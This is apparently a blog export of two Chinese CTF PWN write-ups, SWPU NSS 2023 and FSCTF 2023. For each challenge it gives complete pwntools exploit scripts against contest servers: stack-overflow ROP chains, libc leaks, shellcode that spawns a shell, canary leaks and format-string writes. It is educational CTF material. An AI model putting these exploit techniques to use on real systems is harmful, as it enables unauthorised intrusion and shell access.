<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023年SWPU NSS 秋季招新赛 PWN</title>
    <url>/2023%E5%B9%B4SWPU%20NSS%20%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9B%20PWN/</url>
    <content><![CDATA[<p>2023年SWPU NSS 秋季招新赛 PWN</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p>西南石油大学举办的一场新生赛，总体来说举办的不错，支持支持，明年再来！！！</p>
<hr>
<h2><span id="guess-me">guess me</span></h2><p>签到题，nc再猜猜就完事了</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/1.png"></p>
<hr>
<h2><span id="签到">签到</span></h2><p>签到题，栈溢出，带有后面函数，唯一需要注意的就是需要栈平衡（加个 ret 就行）</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/2.png"></p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/3.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&quot;./111&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28836</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x401232</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0X30</span> + <span class="number">8</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ezlibc">ezlibc</span></h2><p>经典 32 位泄露 libc，不太懂的可以看看 <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a>，这题就是通过 write 函数泄露 libc，自己构造 rop 链，来获取 shell。</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/4.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&quot;./111&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28337</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret_addr = <span class="number">0x804900e</span></span><br><span class="line">main_addr = <span class="number">0x80491B6</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello, there is a ez libc test!!!input:&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">write_addr = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"> </span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="buy">buy</span></h2><p>这题也不难，认真的代码审计就行，仔细的去理清里面的逻辑就行。</p>
<p>刚开始看 vuln 函数，你就会发现 door 函数里面发生了栈溢出，并且还带有后门函数 mygift，可以利用栈溢出来获得 shell，那我们的首要目的就是让 key 等于 1 ，这样才能执行 door 函数。</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/5.png"></p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/6.png"></p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/7.png"></p>
<p>然后我们就找啊找啊，发现在 food 函数可以实现 key 等于 1，但前提就是 money 必须大于 10000，同时你也会发现 money 的数据类型是无符号整形，让他等于负数，就可以实现整形溢出的效果，这样 money 就会蹭蹭的往上涨。</p>
<p>其次需要注意的就是不同函数的来回切换，你需要想好你要干什么，这样才能获得 shell。</p>
<p>这题同样需要栈平衡（怎么判呢？如果 payload &#x3D; 垃圾数据 + system + binsh 打不通的话，不妨试试在 system 前面加个 ret 栈平衡一下）</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/8.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># io = process(&quot;./111&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28209</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x401544</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;what do you want?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many?\n&#x27;</span>, <span class="string">b&#x27;-11&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;what do you want?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0XA</span> + <span class="number">8</span>) + p64(ret_addr) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="神奇的-strlen">神奇的 strlen</span></h2><p>查看一下保护机制，只打开了 NX。</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/9.png"></p>
<p>IDA 反汇编一下，发现发生了栈溢出，但是前提是需要绕过 strlen（只需要通过 <code>\x00</code> 绕过），还有一个点需要注意就是上面需要输入一个整数（尽可能大点的数就行）。</p>
<p>这里有个坑不知道你们踩了没，这题是用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>而不是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>希望大家注意一下，弄得我想半天没有写出来……</p>
<p>准备工作完毕，开干！</p>
<p><img src="/images/2023%E5%B9%B4SWPUNSS%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E8%B5%9BPWN/10.png"></p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28171</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011F6</span></span><br><span class="line">rdi_addr = <span class="number">0x401373</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many bytes do you want to input?\n&#x27;</span>, <span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">7</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input something else~\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># put_addr = u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># print(hex(put_addr))</span></span><br><span class="line"> </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;How many bytes do you want to input?\n&#x27;</span>, <span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">7</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input something else~\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="shellcode">Shellcode</span></h2><p>正常的一道 shellcode 的题目，刚开始不能反汇编，以为会很难（因为汇编代码不是很懂），结果发现直接上就完事了（注意一下 64 位的环境就行）</p>
<p><strong>exp 如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload = b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"> </span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结：</span></h1><p>这次比赛总体不错，RE 和 CRYPTO 都做了些，可惜的就是 PWN 没有 ak，暴露出了自己的弱点，还是要慢慢沉淀，对汇编还真的不是很熟，加油吧，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SWPU NSS</tag>
      </tags>
  </entry>
  <entry>
    <title>FSCTF 2023 PWN</title>
    <url>/FSCTF%202023%20PWN/</url>
    <content><![CDATA[<p>FSCTF 2023 PWN</p>
<span id="more"></span>

<h1><span id="简介">简介</span></h1><p>FSCTF新生赛是由中国民航大学、天津理工大学、滁州学院、吉林师范大学、三明学院(排名不分先后)等5所高校共同举办的CTF新生赛，比赛涵盖 Web、Pwn、Reverse、Crypto、Misc 等赛题方向。通过此次比赛，希望能够提高参赛师傅们的实践能力，促进进一步学习竞赛知识的热情，并为大家提供一个展示自我、交流合作的平台。</p>
<p>完结撒花！！！</p>
<p>这次新生赛挺有意思的，PWN 的签到题 nc（不知道是不是真的签到 -_-），做的真的会怀疑人生（也是好事，这个知识点肯定是自己的盲区，学到了学到了），What am I thinking?也挺有意思的，没给文件让我们用 pwntools 去整，总体来说，做的很开心，学到了很多，明年再来！！！</p>
<hr>
<h2><span id="nc">nc</span></h2><p>这道题做的真会让人怀疑这真的是一道签到题吗，做的人真的会麻木，不过看了 WP，这个点明白了还是很不错的，以下就是可以获得 flag 的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;0&amp;&amp;<span class="built_in">tac</span> fl*</span><br><span class="line"><span class="built_in">tac</span> fl*&gt;&amp;0</span><br><span class="line"><span class="built_in">tac</span> fl*&gt;&amp;2</span><br></pre></td></tr></table></figure>

<p><img src="/images/FSCTF2023PWN/1.png"></p>
<p><img src="/images/FSCTF2023PWN/2.png"></p>
<hr>
<h2><span id="rdi">rdi</span></h2><p>查看一下保护机制，只打开了 NX。</p>
<p><img src="/images/FSCTF2023PWN/3.png"></p>
<p>IDA 一下，代码审计一下，你会发现发生了栈溢出，并且有个 <code>system</code>，但是没有 <code>binsh</code>，这样的话就看下能不能再执行文件里面找到 <code>sh</code>。</p>
<p><img src="/images/FSCTF2023PWN/4.png"></p>
<p><img src="/images/FSCTF2023PWN/5.png"></p>
<p><code>ROPgadget</code> 搜索一手，发现了 <code>sh</code>（和 <code>binsh</code> 有一样的功能），这样就好办，知道 <code>system</code> 和 <code>sh</code>，这题就是考察 64 位传参的知识了（可以看 <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">[Pwn Pwn Pwn!!! 技巧（1）]</a>），这题是不需要栈平衡的，直接上 exp。</p>
<p><img src="/images/FSCTF2023PWN/6.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28993</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4007d3</span></span><br><span class="line">ret_addr = <span class="number">0x400546</span></span><br><span class="line">sys_addr = <span class="number">0x4006FB</span></span><br><span class="line">bin_sh = <span class="number">0x40080d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="stackmat">stackmat</span></h2><p>老规矩看看保护机制，打开了 <code>canary</code> 和 <code>NX</code>，思路就来了（想办法泄露 canary）。</p>
<p><img src="/images/FSCTF2023PWN/7.png"></p>
<p>IDA 反汇编一下，发现了格式字符串漏洞和栈溢出，运行程序看看偏移（结果偏移为 8）。</p>
<p><img src="/images/FSCTF2023PWN/8.png"></p>
<p><img src="/images/FSCTF2023PWN/9.png"></p>
<p>GDB 调试一下，发现 canary 是第十一个参数，这样的话就和比赛里的 <a href="https://xzz911.github.io/NewStarCTF%202023%20%5BWEEK%202%5D%20PWN/">NewStarCTF 2023 [WEEK 2] PWN</a> 题目有异曲同工之妙，只是这题不需要栈平衡，直接开干。</p>
<p><img src="/images/FSCTF2023PWN/10.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401229</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I kown you know\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="2str">2str</span></h2><p>查看一下保护机制，32 位程序只打开了 NX。</p>
<p><img src="/images/FSCTF2023PWN/11.png"></p>
<p>IDA 反汇编一下，代码审计你就会发现程序有三点问题：</p>
<ol>
<li><code>v3</code> 是一个 8 位的无符号整型（可能需要用到整型溢出）；</li>
<li>存在一个 <code>if (v3 &gt; 9)</code> 语句，需要绕过；</li>
<li>存在 <code>strcpy</code> 导致的栈溢出。</li>
</ol>
<p>使用 <code>&#39;\x00&#39;</code> 虽然能绕过 <code>if</code>，但无法造成 <code>strcpy</code> 溢出，所以通过整型溢出来解决问题 —— 利用 <code>unsigned __int8</code> 的范围为 <code>0~255</code>，输入字符长度为 <code>256~264</code> 即可。</p>
<p><img src="/images/FSCTF2023PWN/12.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28318</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80492AF</span></span><br><span class="line">ret_addr = <span class="number">0x804900a</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;show me your power\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0xb9</span> + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="what-am-i-thinking">What am I thinking?</span></h2><p>这题挺有意思的（有没有咱家鸽鸽的粉丝），没有附件，显然是让你 <code>nc</code>，去寻找线索。</p>
<p><img src="/images/FSCTF2023PWN/13.png"></p>
<p>一堆英文（翻译后理解），我开始以为是用时间做种子生成随机数，但是没文件就没法这么做。看了 WP 才发现是考察 <code>pwntools</code> 使用。</p>
<p><img src="/images/FSCTF2023PWN/14.png"></p>
<p>注意：</p>
<ul>
<li>开始接受时要先发 <code>\n</code>；</li>
<li>接收数据的方式很重要：<code>recvuntil(b&#39;\nTell&#39;, drop=True)</code>；</li>
<li>drop&#x3D;True 表示去除末尾标识。</li>
</ul>
<blockquote>
<p><code>recvuntil()</code>函数用于接收数据，直到遇到指定的字符串，<code>drop=True</code>参数表示在返回结果时，不包含这个指定的字符串</p>
<p>例：</p>
<p><code>p.recvuntil(b&#39;\nTell&#39;, drop=True)</code>：这行代码接收来自远程服务器的数据，直到遇到字符串&quot;\nTell&quot;为止</p>
</blockquote>
<p>谁黑我家鸽鸽我跟谁急 ☺☺☺☻☻☻</p>
<p><img src="/images/FSCTF2023PWN/15.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28762</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;brain:\n&#x27;</span>)</span><br><span class="line">key = p.recvuntil(<span class="string">b&#x27;\nTell&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;jige&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(key)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;chmod 777 jige&#x27;</span>)</span><br><span class="line">p_ = process(<span class="string">&#x27;./jige&#x27;</span>)</span><br><span class="line">p_.recvuntil(<span class="string">b&#x27;THE NUMBER IS &#x27;</span>)</span><br><span class="line">num = p_.recvuntil(<span class="string">b&#x27;\nCan&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="fi3h">Fi3h</span></h2><p>查看保护机制，开启了 <code>NX</code> 和 <code>PIE</code>。</p>
<p><img src="/images/FSCTF2023PWN/16.png"></p>
<p>这题需要使用 <code>orw</code>，不过原理还没完全搞明白，先贴官方 WP，后续理解后再补。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28785</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;spent in &quot;</span>)</span><br><span class="line"></span><br><span class="line">mmp_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;.. &quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mmp_addr:&quot;</span>, <span class="built_in">hex</span>(mmp_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;seems to be &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot; and&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;something:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1.1.1.&quot;</span> + cyclic(<span class="number">0x88</span>) + p64(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;fantasy:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&quot;\x90&quot;</span> * <span class="number">0x10</span> + asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span class="line">orw += asm(shellcraft.read(<span class="number">3</span>, mmp_addr + <span class="number">0x400</span>, <span class="number">0x100</span>))</span><br><span class="line">orw += asm(shellcraft.write(<span class="number">1</span>, mmp_addr + <span class="number">0x400</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">p.send(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ys-start">YS, START!</span></h2><p>老规矩查看一下保护机制，32位只打开Canary和NX，这题我当时没有做好像就是因为我反汇编不了伪代码，看了下WP，确实有点玄学</p>
<p><img src="/images/FSCTF2023PWN/17.png"></p>
<p>ida搞起来，</p>
<p><img src="/images/FSCTF2023PWN/18.png"></p>
<p>这题还没有弄明白，等会会了再来改，先贴上官方WP</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28454</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0x0804C044</span>) + <span class="string">b&quot;%15$hn&quot;</span> + <span class="string">b&quot;%7$d&quot;</span>)</span><br><span class="line">ver = p.recvuntil(<span class="string">b&quot;,P&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;123&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;asd&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ver&quot;</span>, ver)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
